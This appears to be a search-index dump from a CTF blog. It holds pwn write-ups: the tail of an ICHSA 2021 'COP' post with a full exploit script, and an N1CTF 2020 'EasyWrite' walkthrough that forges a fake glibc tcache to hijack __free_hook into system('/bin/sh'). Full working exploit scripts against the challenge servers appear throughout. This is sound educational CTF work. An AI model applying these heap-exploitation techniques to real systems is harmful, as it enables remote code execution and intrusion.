COP","uri":"/blog/icsha-2021-cop/"},{"categories":["CTF"],"content":"Full script from pwn import * context.binary = 'game' from ctypes import CDLL clib = CDLL('libc.so.6') clib.srand(0) ARRAY_OF_PLAYS_MAXSIZE = 170 array_of_plays = [clib.rand()%3 for _ in range(ARRAY_OF_PLAYS_MAXSIZE)] current_play = 0 r = remote('cop.ichsa.ctf.today', 8011) def choose(opt: int): r.recvuntil('[ ]\\b\\b') r.sendline(str(opt)) def win_round(): global current_play choose(2) r.recvuntil('[ ]\\b\\b') cpu_play = array_of_plays[current_play] current_play += 1 user_play = {0:1, 1:2, 2:0}[cpu_play]+1 r.sendline(str(user_play)) def skip(n: int): choose(3) r.recvuntil('[ ]\\b\\b\\b') r.sendline(str(n)) for i in range(5): win_round() OFFSET_TO_NAME = 0xd018 SIZEOF_PLAY = 24 while current_play \u003c OFFSET_TO_NAME//SIZEOF_PLAY: toskip = min([255, (OFFSET_TO_NAME-current_play*SIZEOF_PLAY)//SIZEOF_PLAY+1]) current_play += toskip skip(toskip) choose(5) # change username r.recvuntil('new username: ') fakeplay = p32(1) + b'a'*10 + pack(context.binary.symbols['print_flag']+0x66) + pack(1) r.sendline(b'a'*(current_play*SIZEOF_PLAY-OFFSET_TO_NAME)+fakeplay) choose(4) # enable ascii art choose(2) # win r.recvuntil('[ ]\\b\\b') r.sendline('1') print(r.recvall()) ","date":"June 3, 2021","objectID":"/blog/icsha-2021-cop/:2:0","tags":["pwn","writeup"],"title":"ICHSA 2021: COP","uri":"/blog/icsha-2021-cop/"},{"categories":["CTF"],"content":"Yet another FILE* walkthrough","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"EasyWrite [278] write? what? where? nc 124.156.183.246 20000 Files: easywrite, libc-2.31.so The library used in this writeup is pwnscripts. ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:0:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"TL;DR Input a fake tcache that has entries[2] = __free_hook-0x8 and count[2] = 1 locate the tcache pointer in libc to overwrite it with the fake one write ‚Äú/bin/sh‚Äù + system() to the next allocated memory enjoy shell from free(). ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:1:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Starting off We‚Äôll start off with some miscellanous information. Exact libc version: $ ./libc-database/identify libc-2.31.so libc6_2.31-0ubuntu9_amd64 Decompiler output: int main() { char **addr; // [rsp-28h] [rbp-28h] char *mem1; // [rsp-20h] [rbp-20h] char *mem2; // [rsp-18h] [rbp-18h] setbuf(stdout, 0); setbuf(stdin, 0); setbuf(stderr, 0); alarm(60); sleep(2); printf(\"Here is your gift:%p\\n\", \u0026setbuf); mem1 = malloc(768); // big 0x310 write(1, \"Input your message:\", 19); read(0, mem1, 767); write(1, \"Where to write?:\", 16); read(0, \u0026addr, 8); *addr = mem1; mem2 = malloc(48); // fastbin 0x40 write(1, \"Any last message?:\", 18); read(0, mem2, 47); free(mem2); return 0; } And checksec: [*] '/easywrite' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] '/libc-2.31.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled main() is really simple: 0. initialisation stuff (remove buffering, set timeout alarm) Free libc leak via printf() A raw read(0x300-1) to a pointer mem1 = malloc(0x300) A pointer (addr) is read from stdin via read(8), and the data at the pointer (*addr) is overwritten with mem1. This is the crux of the challenge. A raw read(0x30-1) to another pointer mem2 = malloc(0x30) free(mem2), and then exit(0) in __libc_start_main. Step (3) requires the user to provide a dereferencable pointer to the program. Since all protections (including ASLR) are on for ./easywrite, the pointer we provide in step (3) must be a part of libc.so.6‚Äôs allocated memory. From there, we can condense main() into an even simpler outline: The user gets to replace a single pointer within libc with a pointer to 0x300-1 bytes of user-controlled data, and The user gets to write 0x30-1 bytes to a malloc()‚Äôd pointer that is immediately free()‚Äôd. There‚Äôs no issue with analysing the binary, but figuring out what to do here is a lot harder. ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:2:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Write where? As the challenge title suggests, the key to pwning the binary here is to figure out where in Glibc to write up. The entire shared object is pretty big, but we can cut down on the search space with a few heuristics. First off, the bulk of libc is non-writeable. We‚Äôre only interested in writeable addresses, so we can skip everything here (the addresses are random; focus on the offsets): 0x00007f2afd967000 0x00007f2afd98c000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afd98c000 0x00007f2afdb04000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afdb04000 0x00007f2afdb4e000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afdb4e000 0x00007f2afdb4f000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afdb4f000 0x00007f2afdb52000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so And just focus on this part: 0x00007f2afdb52000 0x00007f2afdb55000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f2afdb55000 0x00007f2afdb5b000 0x0000000000000000 rw- In IDA, that r/w section starts right off at libc‚Äôs Global Offset Table. That sounds like a good place to start. .got.plt:00000000001EB018 off_1EB018 dq offset memmove ; DATA XREF: bcopy-7E4DC‚Üër .got.plt:00000000001EB018 ; Indirect relocation .got.plt:00000000001EB020 off_1EB020 dq offset strnlen ; DATA XREF: sub_25350+4‚Üër .got.plt:00000000001EB020 ; Indirect relocation .got.plt:00000000001EB028 off_1EB028 dq offset wcschr ; DATA XREF: sub_25360+4‚Üër ... .got.plt:00000000001EB178 off_1EB178 dq offset strcasecmp ; DATA XREF: sub_25600+4‚Üër .got.plt:00000000001EB178 ; Indirect relocation .got.plt:00000000001EB180 off_1EB180 dq offset strncpy ; DATA XREF: sub_25610+4‚Üër .got.plt:00000000001EB180 ; Indirect relocation .got.plt:00000000001EB188 off_1EB188 dq offset memmove ; DATA XREF: sub_25620+4‚Üër .got.plt:00000000001EB188 _got_plt ends ; Indirect relocation ‚Ä¶or it would‚Äôve been, if there were any useful functions in the whole list. Long story short; all of the functions there are never called by the program1, so we‚Äôll move on. After the Procedure Linkage Table, there‚Äôs a long stretch of garbage in the form of the .data and .bss sections, along with a few other __libc_* sections that are basically never referenced either2. A few hours of blank staring later, and my eyes finally saw something I‚Äôd missed the last 10 times I tried scanning IDA View-A: .bss:00000000001EEB28 public __free_hook ; weak .bss:00000000001EEB28 ; __int64 (__fastcall *_free_hook)(_QWORD, _QWORD) .bss:00000000001EEB28 __free_hook dq ? ; DATA XREF: LOAD:0000000000008A48‚Üëo .bss:00000000001EEB28 ; .got:__free_hook_ptr‚Üëo __free_hook? Isn‚Äôt that that thing that I heard about once a long time ago in a writeup somewhere? To repeat something you may already know: __free_hook() is a function pointer that overrides the default behaviour of free() iff __free_hook != NULL. If we change __free_hook to point to a one_gadget (or something), we‚Äôll have beaten the challenge. Let‚Äôs try that. from pwnscripts import * context.binary = 'easywrite' context.libc_database = 'libc-database' context.libc = 'libc-2.31.so' context.log_level = 'debug' r = context.binary.process() context.libc.calc_base('setbuf', unpack_hex(r.recvline())) free_hook = 0x00000000001EEB28+context.libc.address r.sendafter('Input your message:', pack(context.libc.select_gadget(1))) r.sendafter('Where to write?:', pack(free_hook)) r.sendafter('Any last message?:', b'\\0') r.interactive() Things are never so simple, of course. [DEBUG] Received 0x12 bytes: b'Any last message?:' [DEBUG] Sent 0x1 bytes: 0 * 0x1 [*] Switching to interactive mode $ ls [DEBUG] Sent 0x3 bytes: b'ls\\n' [*] Got EOF while reading in interactive $ A little backtracing in gdb shows the issue. First, we‚Äôll let it crash, and observe the backtrace: [#0] Id 1, Name: \"ld-linux-x86-64\", stopped 0x555556b192a0 in ?? (), reason: SIGSEGV trace [#0] 0x555556b192a0 ‚Üí out 0x3c, al [#1] ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:3:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Digging into malloc.c Looking back at the code, I was convinced that the second allocation of memory had to be important ‚Äî this was a CTF challenge, after all. What I didn‚Äôt immediately understand was how glibc‚Äôs heap system could be affected by any write-to-libc. The heap always lies on a separate page; there‚Äôs no way to write to there directly. Lollygagging about gdb, I tried to find anything that might be useful to understanding the heap. gef‚û§ heap chunks Chunk(addr=0x555556b19010, size=0x290, flags=PREV_INUSE) [0x0000555556b19010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x555556b192a0, size=0x310, flags=PREV_INUSE) [0x0000555556b192a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x555556b195b0, size=0x40, flags=PREV_INUSE) [0x0000555556b195b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................] Chunk(addr=0x555556b195f0, size=0x20a20, flags=PREV_INUSE) ‚Üê top chunk gef‚û§ heap bins Tcachebins for arena 0x7f53d96a8b80 Fastbins for arena 0x7f53d96a8b80 Fastbins[idx=0, size=0x20] 0x00 Fastbins[idx=1, size=0x30] 0x00 Fastbins[idx=2, size=0x40] 0x00 Fastbins[idx=3, size=0x50] 0x00 Fastbins[idx=4, size=0x60] 0x00 Fastbins[idx=5, size=0x70] 0x00 Fastbins[idx=6, size=0x80] 0x00 Unsorted Bin for arena '*0x7f53d96a8b80' [+] Found 0 chunks in unsorted bin. Small Bins for arena '*0x7f53d96a8b80' [+] Found 0 chunks in 0 small non-empty bins. Large Bins for arena '*0x7f53d96a8b80' [+] Found 0 chunks in 0 large non-empty bins. Wait a minute. arena 0x7f53d96a8b80? That sounds a lot like a libc pointer. gef‚û§ heap arenas Arena (base=0x7f53d96a8b80, top=0x555556b195e0, last_remainder=0x0, next=0x7f53d96a8b80, next_free=0x0, system_mem=0x21000) gef‚û§ vmmap ... 0x00007f53d96a8000 0x00007f53d96ab000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x00007f53d96ab000 0x00007f53d96b1000 0x0000000000000000 rw- ... And it is! In IDA Pro, this part of libc was labelled as the uninspiring dword_1EBB80, so this was definitely a lucky find. With a bit of searching, we can find the structure of the arena: struct malloc_state { __libc_lock_define (, mutex); int flags; int have_fastchunks; mfastbinptr fastbinsY[NFASTBINS]; // starts from 0x10 (?) mchunkptr top; // This is +0x60 mchunkptr last_remainder; mchunkptr bins[NBINS * 2 - 2]; unsigned int binmap[BINMAPSIZE]; struct malloc_state *next; struct malloc_state *next_free; INTERNAL_SIZE_T attached_threads; INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; } Of particular note are the various m.*ptr variables, as well as the next.* pointers. Overwriting any of these could change the behaviour of the heap. I started off by overwriting the top pointer, assessing what would happen if I replaced it with a pointer to garbage bytes #free_hook = 0x00000000001EEB28+context.libc.address arena = 0x1EBB80 + context.libc.address r.sendafter('Input your message:', b'a'*500) r.sendafter('Where to write?:', pack(arena + 0x60)) r.sendafter('Any last message?:', b'\\0') r.interactive() We get an interesting crash: [DEBUG] Received 0x10 bytes: b'Where to write?:' [DEBUG] Sent 0x8 bytes: 00000000 e0 cb 02 12 02 7f 00 00 ‚îÇ¬∑¬∑¬∑¬∑‚îÇ¬∑¬∑¬∑¬∑‚îÇ 00000008 [DEBUG] Received 0x1d bytes: b'malloc(): corrupted top size\\n' Traceback (most recent call last): The top chunk, like all malloc‚Äôd chunks, follows the following format: struct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk *fd, *bk; /* double links -- used only if free. */ struct malloc_chunk *fd_nextsize, *bk_nextsize; /* double links -- used only if free. */ } glibc detects that the top chunk is a bit too large, and sends the program to abort: static void *_int_malloc (mstate av, size_t bytes) { ... if (__glibc_unlikely (size \u003e av-\u003esystem_mem)) malloc_printerr (\"malloc(): corrupted top size\"); ... } If we fix the mchunk_size to fit the glibc check‚Ä¶ not much i","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:4:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Implementation Hell It was simple enough to create the fake tcache in python: SIZE = 0x40 #size of the second allocation def tcache_perthread_struct(fake_ptrs: dict): '''fake_ptrs has (address: size) key-pairs''' def csize2tidx(x): return (x-1)//16 -1 TCACHE_MAX_BINS = 0x40 counts = [0 for _ in range(TCACHE_MAX_BINS)] entries = [0 for _ in range(TCACHE_MAX_BINS)] for addr,size in fake_ptrs.items(): tidx = csize2tidx(size) counts[tidx] += 1 entries[tidx] = addr return b''.join(map(p16,counts)) + b''.join(map(p64,entries)) fake_tcache = tcache_perthread_struct({free_hook: SIZE}) The issue arrives with figuring out precisely where the tcache pointer is. IDA Pro was not4 very helpful. Eventually, I figured out from online sources that the tcache (the real tcache in memory; not the pointer to the tcache) is always located at heap_address+0x10. From there, I used gdb to search for pointers to that space in memory: gef‚û§ vmmap heap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000555557527000 0x0000555557548000 0x0000000000000000 rw- [heap] gef‚û§ grep 0x0000555557527010 [+] Searching '\\x10\\x70\\x52\\x57\\x55\\x55\\x00\\x00' in memory [+] In '[heap]'(0x555557527000-0x555557548000), permission=rw- 0x5555575275b8 - 0x5555575275d8 ‚Üí \"\\x10\\x70\\x52\\x57\\x55\\x55\\x00\\x00[...]\" [+] In (0x7facf8661000-0x7facf8667000), permission=rw- 0x7facf8666530 - 0x7facf8666550 ‚Üí \"\\x10\\x70\\x52\\x57\\x55\\x55\\x00\\x00[...]\" gef‚û§ vmmap libc [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x00007facf8473000 0x00007facf8498000 0x0000000000000000 r-- /home/a/libc-database/libs/libc6_2.31-0ubuntu9_amd64/libc.so.6 There‚Äôs only one pointer (0x7facf8666530) from the libc region, so we‚Äôll take that to be the tcache pointer. All that‚Äôs left to do is to grab a one_gadget and run with it: from pwnscripts import * context.binary = 'easywrite' context.libc_database = 'libc-database' context.libc = 'libc-2.31.so' context.log_level = 'debug' r = context.binary.process() context.libc.calc_base('setbuf', unpack_hex(r.recvline())) def tcache_perthread_struct(fake_ptrs: dict): '''fake_ptrs has (address: size) key-pairs''' def csize2tidx(x): return (x-1)//16 -1 TCACHE_MAX_BINS = 0x40 counts = [0 for _ in range(TCACHE_MAX_BINS)] entries = [0 for _ in range(TCACHE_MAX_BINS)] for addr,size in fake_ptrs.items(): tidx = csize2tidx(size) counts[tidx] += 1 entries[tidx] = addr return b''.join(map(p16,counts)) + b''.join(map(p64,entries)) SIZE = 0x40 # size of the 2nd allocation free_hook = 0x00000000001EEB28+context.libc.address tcache_pointer = 0x7facf8666530-0x00007facf8473000 + context.libc.address fake_tcache = tcache_perthread_struct({free_hook: SIZE}) r.sendafter('Input your message:', fake_tcache) r.sendafter('Where to write?:', pack(tcache_pointer)) r.sendafter('Any last message?:', pack(context.libc.select_gadget(1))) r.interactive() And we get a shell: stack [!] Unmapped address code:x86:64 0x7f792a05bda9 \u003cexecvpe+1337\u003e mov rax, QWORD PTR [rbp-0x68] 0x7f792a05bdad \u003cexecvpe+1341\u003e mov QWORD PTR [rbp-0x48], rax 0x7f792a05bdb1 \u003cexecvpe+1345\u003e jmp 0x7f792a05bcdb \u003cexecvpe+1131\u003e ‚Üí 0x7f792a05bdb6 \u003cexecvpe+1350\u003e call 0x7f792a0a7970 \u003c__stack_chk_fail\u003e ‚Ü≥ 0x7f792a0a7970 \u003c__stack_chk_fail+0\u003e endbr64 0x7f792a0a7974 \u003c__stack_chk_fail+4\u003e push rax 0x7f792a0a7975 \u003c__stack_chk_fail+5\u003e pop rax 0x7f792a0a7976 \u003c__stack_chk_fail+6\u003e lea rdi, [rip+0x876e7] # 0x7f792a12f064 0x7f792a0a797d \u003c__stack_chk_fail+13\u003e sub rsp, 0x8 0x7f792a0a7981 \u003c__stack_chk_fail+17\u003e call 0x7f792a0a7990 \u003c__fortify_fail\u003e arguments (guessed) __stack_chk_fail ( ) threads [#0] Id 1, Name: \"ld-linux-x86-64\", stopped 0x7f792a05bdb6 in execvpe (), reason: SIGSEGV trace [#0] 0x7f792a05bdb6 ‚Üí execvpe() [#1] 0x7f7929f9c0b3 ‚Üí __libc_start_main() [#2] 0x7f792a16a17e ‚Üí hlt [#3] 0x7ffe534a51a8 ‚Üí sbb al, 0x0 gef‚û§ Wait, what? ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:5:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Triage We‚Äôll modify the code a little bit to stop at the one_gadget: oneg = context.libc.select_gadget(1) gdb.attach(r, gdbscript='b *'+hex(oneg)+'\\nc') r.sendafter('Any last message?:', pack(oneg)) gdb is enlightening: $rax : 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 $rbx : 0x00007f98a3f273a0 ‚Üí 0x8d4c5741fa1e0ff3 $rcx : 0x00007f98a3e42fb2 ‚Üí 0x5677fffff0003d48 (\"H=\"?) $rdx : 0x2f $rsp : 0x00007ffe510e5638 ‚Üí 0x00007f98a3f27376 ‚Üí 0x4d8b4800000000b8 $rbp : 0x00007ffe510e5660 ‚Üí 0x0000000000000000 $rsi : 0x00007f98a3f27376 ‚Üí 0x4d8b4800000000b8 $rdi : 0x00007f98a3f20b28 ‚Üí 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 $rip : 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 $r8 : 0x00007f98a3f20b28 ‚Üí 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 $r9 : 0x00007f98a3d39548 ‚Üí 0x0000000000000000 $r10 : 0x00007f98a3f1dbe0 ‚Üí 0x0000555555ab55a0 ‚Üí 0x0000000000000000 $r11 : 0x246 $r12 : 0x00007f98a3f27150 ‚Üí 0x8949ed31fa1e0ff3 $r13 : 0x00007ffe510e5748 ‚Üí 0x000000000000001c $r14 : 0x0 $r15 : 0x0 $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 stack 0x00007ffe510e5638‚îÇ+0x0000: 0x00007f98a3f27376 ‚Üí 0x4d8b4800000000b8 ‚Üê $rsp 0x00007ffe510e5640‚îÇ+0x0008: 0x00007f98a3f25530 ‚Üí 0x0000555555ab52a0 ‚Üí 0x0000000000000000 0x00007ffe510e5648‚îÇ+0x0010: 0x0000555555ab52a0 ‚Üí 0x0000000000000000 0x00007ffe510e5650‚îÇ+0x0018: 0x00007f98a3f20b28 ‚Üí 0x00007f98a3e18ce6 ‚Üí \u003cexecvpe+1142\u003e mov rsi, r10 0x00007ffe510e5658‚îÇ+0x0020: 0x0caf9f8a935f0f00 0x00007ffe510e5660‚îÇ+0x0028: 0x0000000000000000 ‚Üê $rbp 0x00007ffe510e5668‚îÇ+0x0030: 0x00007f98a3d590b3 ‚Üí \u003c__libc_start_main+243\u003e mov edi, eax 0x00007ffe510e5670‚îÇ+0x0038: 0x0000000000000000 code:x86:64 0x7f98a3e18cd8 \u003cexecvpe+1128\u003e add DWORD PTR [rbp+0x52], esi 0x7f98a3e18cdb \u003cexecvpe+1131\u003e mov QWORD PTR [r10+0x10], 0x0 0x7f98a3e18ce3 \u003cexecvpe+1139\u003e mov rdx, r12 ‚Üí 0x7f98a3e18ce6 \u003cexecvpe+1142\u003e mov rsi, r10 0x7f98a3e18ce9 \u003cexecvpe+1145\u003e lea rdi, [rip+0xd08ba] # 0x7f98a3ee95aa 0x7f98a3e18cf0 \u003cexecvpe+1152\u003e mov QWORD PTR [rbp-0x78], r11 0x7f98a3e18cf4 \u003cexecvpe+1156\u003e call 0x7f98a3e18160 \u003cexecve\u003e 0x7f98a3e18cf9 \u003cexecvpe+1161\u003e mov r11, QWORD PTR [rbp-0x78] 0x7f98a3e18cfd \u003cexecvpe+1165\u003e mov eax, DWORD PTR fs:[r14] threads [#0] Id 1, Name: \"ld-linux-x86-64\", stopped 0x7f98a3e18ce6 in execvpe (), reason: BREAKPOINT The one_gadget requirements here probably failed. These are the three4 gadgets available: 0xe6ce3 execve(\"/bin/sh\", r10, r12) constraints: [r10] == NULL || r10 == NULL [r12] == NULL || r12 == NULL 0xe6ce6 execve(\"/bin/sh\", r10, rdx) constraints: [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL 0xe6ce9 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL Cross-referencing between this and the gdb context, it becomes apparent that there‚Äôs no easy one_gadget to jump to. After spending an hour or so staring at ROP gadgets6 and potential one_gadget alternatives, I realised the rather obvious exploit path I was missing. __free_hook(ptr) is called with the ptr to be freed, which happens to be memory that we‚Äôre in control of. Why not just jump to system(), and put \"/bin/sh\" at the front of the allocated memory? fake_tcache = tcache_perthread_struct({free_hook-0x8: SIZE}) # -8 to store /bin/sh r.sendafter('Input your message:', fake_tcache) r.sendafter('Where to write?:', pack(tcache_pointer)) r.sendafter('Any last message?:', b'/bin/sh\\0' + pack(context.libc.symbols['system'])) r.interactive() [*] Switching to interactive mode $ echo hello [DEBUG] Sent 0xb bytes: b'echo hello\\n' [DEBUG] Received 0x6 bytes: b'hello\\n' hello $ It worked. [+] Opening connection to 124.156.183.246 on port 20000: Done [*] Switching to interactive mode [*] Got EOF while reading in interactive $ f ‚Ä¶locally. Not on remote. Long story short, I was using ld-linux.so --library-path to simulate the remote libc-2.31.so environment, but ld-linux doesn‚Äôt provide a perfect subs","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:6:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Full code from pwnscripts import * context.binary = 'easywrite' context.libc_database = 'libc-database' context.libc = 'libc-2.31.so' r = remote('124.156.183.246', 20000) context.libc.calc_base('setbuf', unpack_hex(r.recvline())) def tcache_perthread_struct(fake_ptrs: dict): '''fake_ptrs has (address: size) key-pairs''' def csize2tidx(x): return (x-1)//16 -1 TCACHE_MAX_BINS = 0x40 counts = [0 for _ in range(TCACHE_MAX_BINS)] entries = [0 for _ in range(TCACHE_MAX_BINS)] for addr,size in fake_ptrs.items(): tidx = csize2tidx(size) counts[tidx] += 1 entries[tidx] = addr return b''.join(map(p16,counts)) + b''.join(map(p64,entries)) SIZE = 0x40 # size of the 2nd allocation tcache_pointer = 0x7f638ae58530-0x00007f638ac65000+context.libc.address-0x40 fake_tcache = tcache_perthread_struct({context.libc.symbols['__free_hook']-0x8: SIZE}) r.sendafter('Input your message:', fake_tcache) r.sendafter('Where to write?:', pack(tcache_pointer)) r.sendafter('Any last message?:', b'/bin/sh\\0' + pack(context.libc.symbols['system'])) r.interactive() ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:7:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"},{"categories":["CTF"],"content":"Footnotes ‚Ä¶which is practically identical what I said at the start of the writeup. You can personally test this by overwriting all the values of .got.plt with garbage in gdb. The program exits gracefully. Particularly, __libc_IO_vtables is useless here, because main() is committed to using raw read()s and write()s, instead of the standard I/O functions provided by libc. The code for fastbin-malloc doesn‚Äôt do much for us here. (Note that the fastbin_index for malloc(0x30) is 2) #define fastbin_index(sz) ((((unsigned int) (sz)) \u003e\u003e (SIZE_SZ == 8 ? 4 : 3)) - 2) #define fastbin(ar_ptr, idx) ((ar_ptr)-\u003efastbinsY[idx]) static void *_int_malloc (mstate av, size_t bytes) { INTERNAL_SIZE_T nb = ...; /* normalized request size */ unsigned int idx = ...; /* associated bin index */ mchunkptr victim; /* inspected/selected chunk */ ... if (this is a fastbin) { idx = fastbin_index (nb); mfastbinptr *fb = \u0026fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) { if (SINGLE_THREAD_P) *fb = victim-\u003efd; // else ... if (__glibc_likely (victim != NULL)) { size_t victim_idx = fastbin_index (chunksize (victim)); //if (__builtin_expect (victim_idx != idx, 0)) // malloc_printerr (\"malloc(): memory corruption (fast)\"); check_remalloced_chunk (av, victim, nb); #if USE_TCACHE ... #endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } .... } The most important thing to note here is that the pointer returned for the fastbin is always going to be the pointer directly located at av-\u003efastbinsY[idx], which our exploit can only replace with another valid heap pointer. A doubly allocated chunk of memory might be useful if there is more than one free(), but in this case, the fastbin is not very obviously useful. I tried to dig through malloc() in IDA to find it: v5 = unk_1F1520; if ( unk_1F1520 ) { if ( v4 \u003e= (unsigned __int64)off_1EB2D0 ) goto LABEL_7; } else { if ( unk_1F1528 ) goto LABEL_7; sub_9BAC0(); if ( (unsigned __int64)off_1EB2D0 \u003c= v4 ) goto LABEL_7; v5 = unk_1F1520; if ( !unk_1F1520 ) goto LABEL_7; } a4 = (__int16 *)(v5 + 2 * v4); v10 = *a4; if ( *a4 ) { v11 = v5 + 8 * v4; v7 = *(_QWORD **)(v11 + 128); *(_QWORD *)(v11 + 128) = *v7; *a4 = v10 - 1; v7[1] = 0LL; return (__int64)v7; } v5 vaguely appears to match up with the global tcache pointer, but none of the global variables (unk/off.*) here point towards the actual location (offset 0x1f34f0) of the tcache pointer I found. Conclusion: I have no idea what‚Äôs going on here. A modified version of one_gadget can actually detect two more one_gadgets, but those are unsatisfiable too. And I still think that this would be an interesting method. The gdb context shows that [rsp+0x10] is the location of the user-controlled tcache written earlier in the exploit. If a mov rsp, [rsp+0x10]; pop %; ret gadget (or anything effectively similar, like pop; pop; pop rsp; pop; ret) existed, it would be possible to write a ROP chain within the fake tcache itself. Staring at ropper and ROPGadget and IDA for an hour wasn‚Äôt enough to eliminate this possiblity: libc really does have a lot of gadgets, and a symbolic engine might be able to find what I may have missed. And if you know of a better way of running different libc versions, send me a ping over here; it‚Äôd be really useful to know. So far I have tried Using LD_PRELOAD, which in the correct order (ld-linux.so first) will run the binary without crashing, although other issues still surface Running ./ld-linux.so, as outlined in the writeup. This has numerous side effects, including the actual binary getting allocated to an 0x7f.* page instead of the expected 0x5.* address LD_LIBRARY_PATH, which is finicky enough that I have not investigated it throughly in the past ","date":"October 19, 2020","objectID":"/blog/n1ctf-2020-easywrite/:8:0","tags":["pwn","writeup"],"title":"N1CTF 2020: EasyWrite","uri":"/blog/n1ctf-2020-easywrite/"}]